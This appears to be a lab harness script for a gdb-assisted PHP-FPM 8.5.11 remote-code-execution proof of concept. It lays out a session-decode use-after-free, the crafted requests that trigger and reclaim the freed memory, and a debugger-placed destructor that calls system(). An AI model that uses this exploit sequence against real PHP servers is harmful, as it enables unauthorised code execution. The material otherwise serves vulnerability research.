#!/usr/bin/env bash
# gdb-assisted PHP-FPM 8.5.11 RCE proof (probe-fire4.gdb).
#
# The A request leaves a dangling php_unserialize_data (decode OOM inside
# session_start). The B request reclaims it with a 5-page file-part name and
# decodes one session variable. At zend_array_destroy/zend_hash_destroy entry
# the probe sets the session HashTable pDestructor to zif_system and writes a
# fake zend_execute_data at its bucket 0, so the destructor call runs
# system("id > /tmp/fpm5_proof").
#
# This proves the FPM call mechanics with the frame placed in memory. The
# native chain still needs a heap leak to place an absolute last_dtor.
#
# usage: ./run_fire4.sh [http_port] [fcgi_port]
#   http_port  nginx port for PHP requests (default 9002)
#   fcgi_port  direct FastCGI port of the probe container (default 9003)
#
# requires: docker, python3, curl. The nginx container p2s-nginx-8511 must be
# running on p2s-fpm-net with its upstream set to p2s-fpm-8511:9000.
set -euo pipefail

HTTP_PORT=${1:-9002}
FCGI_PORT=${2:-9003}
CT=${CT:-p2s-fpm-8511}
NET=${NET:-p2s-fpm-net}
IMG=${IMG:-p2s-fpm-gdb:8511}
PROOF=/tmp/fpm5_proof
DIR=$(cd "$(dirname "$0")" && pwd)
WWW=$(cd "$DIR/../www" && pwd)
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

docker network inspect "$NET" >/dev/null
docker inspect p2s-nginx-8511 >/dev/null

echo "[1/5] start $CT"
docker rm -f "$CT" >/dev/null 2>&1 || true
docker run -d --name "$CT" --network "$NET" \
    -p "127.0.0.1:$FCGI_PORT:9000" \
    -v "$WWW:/var/www/html:ro" \
    -v "$DIR/zz-single.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
    -v "$DIR/probe-fire4.gdb:/tmp/probe-fire4.gdb:ro" \
    "$IMG" gdb -q -batch -x /tmp/probe-fire4.gdb --args /usr/local/sbin/php-fpm -F >/dev/null

for _ in $(seq 1 50); do
    if docker logs "$CT" 2>&1 | grep -q "ready to handle connections"; then
        break
    fi
    sleep 0.2
done
docker logs "$CT" 2>&1 | grep -q "ready to handle connections"

echo "[2/5] S1: 1.19 MB serialized array; S2: one integer"
python3 "$DIR/mk_a_payload.py" --out "$TMP/a.bin" >/dev/null
curl -s -D "$TMP/s1.hdr" -o /dev/null -F "d=@$TMP/a.bin" \
    "http://127.0.0.1:$HTTP_PORT/fpm_sess.php"
S1=$(grep -o 'PHPSESSID=[a-f0-9]*' "$TMP/s1.hdr" | cut -d= -f2)
curl -s -D "$TMP/s2.hdr" -o /dev/null --form-string 'd=i:12345;' \
    "http://127.0.0.1:$HTTP_PORT/fpm_sess.php"
S2=$(grep -o 'PHPSESSID=[a-f0-9]*' "$TMP/s2.hdr" | cut -d= -f2)
test -n "$S1" && test -n "$S2"

echo "[3/5] A: session decode OOM (stale BG(unserialize).data)"
CODE=$(curl -s -o /dev/null -w '%{http_code}' -b "PHPSESSID=$S1" \
    "http://127.0.0.1:$HTTP_PORT/fpm_sess_oom.php" || true)
echo "      A http=$CODE"

echo "[4/5] B: 5-page raw file-part name reclaims d"
python3 "$DIR/fcgi_dreclaim.py" "$FCGI_PORT" "$S2" 5 0 || true

echo "[5/5] proof"
sleep 0.5
docker cp "$CT:$PROOF" "$TMP/proof" >/dev/null 2>&1 || true
if [ -s "$TMP/proof" ]; then
    echo "RCE OK"
    cat "$TMP/proof"
else
    echo "RCE failed: no $PROOF in $CT" >&2
    docker cp "$CT:/tmp/fpm-fire.log" "$TMP/fpm-fire.log" >/dev/null 2>&1 || true
    if [ -s "$TMP/fpm-fire.log" ]; then
        grep -E 'FLUSH|ADEST|DESTHT|FRAME|SYSRIG|SYSE|WATCH|SIGSEGV' "$TMP/fpm-fire.log" >&2 || true
    fi
    exit 1
fi
